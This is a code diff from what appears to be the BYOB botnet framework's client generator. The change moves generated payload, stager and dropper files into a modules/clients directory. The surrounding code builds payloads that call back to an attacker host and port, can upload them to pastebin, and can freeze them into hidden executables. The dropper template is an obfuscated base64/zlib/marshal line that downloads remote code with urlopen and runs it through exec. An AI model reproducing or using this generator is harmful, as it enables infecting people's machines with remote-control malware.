@@ -300,11 +300,17 @@ except ImportError: pass
     modules = '\n'.join(([open(module,'r').read().partition('# main')[2] for module in kwargs['modules']] + [generators.main('Payload', **{"host": options.host, "port": options.port, "pastebin": options.pastebin if options.pastebin else str()}) + '_payload.run()']))
     payload = '\n'.join((loader, test_imports, potential_imports, modules))
 
-    if not os.path.isdir('modules/payloads'):
+    if not os.path.isdir('modules/clients'):
         try:
-            os.mkdir('modules/payloads')
+            os.mkdir('modules/clients')
         except OSError:
-            util.log("Permission denied: unabled to make directory './modules/payloads/'")
+            util.log("Permission denied: unabled to make directory './modules/clients/'")
+
+    if not os.path.isdir('modules/clients/payloads'):
+        try:
+            os.mkdir('modules/clients/payloads')
+        except OSError:
+            util.log("Permission denied: unabled to make directory './modules/clients/payloads/'")
 
     if options.compress:
         util.display("\tCompressing payload... ", color='reset', style='normal', end=' ')
@@ -334,7 +340,7 @@ except ImportError: pass
         assert options.pastebin, "missing argument 'pastebin' required for option 'pastebin'"
         url = util.pastebin(payload, options.pastebin)
     else:
-        dirs = ['modules/payloads','byob/modules/payloads','byob/byob/modules/payloads']
+        dirs = ['modules/clients/payloads','byob/modules/clients/payloads','byob/byob/modules/clients/payloads']
         dirname = '.'
         for d in dirs:
             if os.path.isdir(d):
@@ -366,11 +372,17 @@ def _stager(options, **kwargs):
     else:
         stager = open('core/stagers.py', 'r').read() + generators.main('run', url=kwargs['url'])
 
-    if not os.path.isdir('modules/stagers'):
+    if not os.path.isdir('modules/clients'):
         try:
-            os.mkdir('modules/stagers')
+            os.mkdir('modules/clients')
         except OSError:
-            util.log("Permission denied: unable to make directory './modules/stagers/'")
+            util.log("Permission denied: unabled to make directory './modules/clients/'")
+
+    if not os.path.isdir('modules/clients/stagers'):
+        try:
+            os.mkdir('modules/clients/stagers')
+        except OSError:
+            util.log("Permission denied: unable to make directory './modules/clients/stagers/'")
 
     if options.compress:
         util.display("\tCompressing stager... ", color='reset', style='normal', end=' ')
@@ -389,7 +401,7 @@ def _stager(options, **kwargs):
         assert options.pastebin, "missing argument 'pastebin' required for option 'pastebin'"
         url = util.pastebin(stager, options.pastebin)
     else:
-        dirs = ['modules/stagers','byob/modules/stagers','byob/byob/modules/stagers']
+        dirs = ['modules/clients/stagers','byob/modules/clients/stagers','byob/byob/modules/clients/stagers']
         dirname = '.'
         for d in dirs:
             if os.path.isdir(d):
@@ -417,21 +429,44 @@ def _dropper(options, **kwargs):
     assert 'var' in kwargs, "missing keyword argument 'var'"
     assert 'hidden' in kwargs, "missing keyword argument 'hidden'"
 
+    if not os.path.isdir('modules/clients'):
+        try:
+            os.mkdir('modules/clients')
+        except OSError:
+            util.log("Permission denied: unabled to make directory './modules/clients/'")
+    
+    if not os.path.isdir('modules/clients/droppers'):
+        try:
+            os.mkdir('modules/clients/droppers')
+        except OSError:
+            util.log("Permission denied: unabled to make directory './modules/clients/droppers/'")
+    
+    dirs = ['modules/clients/droppers','byob/modules/clients/droppers','byob/byob/modules/clients/droppers']
+    dirname = '.'
+    for d in dirs:
+        if os.path.isdir(d):
+            dirname = d
+
     name = 'byob_{}.py'.format(kwargs['var']) if not options.name else options.name
     if not name.endswith('.py'):
         name += '.py'
+
+    path = os.path.join(os.path.abspath(dirname), name)
+
     dropper = """import sys,zlib,base64,marshal,json,urllib
 if sys.version_info[0] > 2:
     from urllib import request
 urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
 exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))""".format(repr(base64.b64encode(zlib.compress(marshal.dumps("urlopen({}).read()".format(repr(kwargs['url'])),2)))))
-    with open(name, 'w') as fp:
+
+    with open(path, 'w') as fp:
         fp.write(dropper)
-    util.display('({:,} bytes written to {})'.format(len(dropper), name), style='dim', color='reset')
+
+    util.display('({:,} bytes written to {})'.format(len(dropper), path), style='dim', color='reset')
 
     if options.freeze:
         util.display('\tCompiling executable...\n', color='reset', style='normal', end=' ')
-        name = generators.freeze('modules/payloads/' + kwargs['var'] + '.py', icon=options.icon, hidden=kwargs['hidden'], debug=options.debug)
+        name = generators.freeze('modules/clients/payloads/' + kwargs['var'] + '.py', icon=options.icon, hidden=kwargs['hidden'], debug=options.debug)
         util.display('({:,} bytes saved to file: {})\n'.format(len(open(name, 'rb').read()), name))
     return name
 
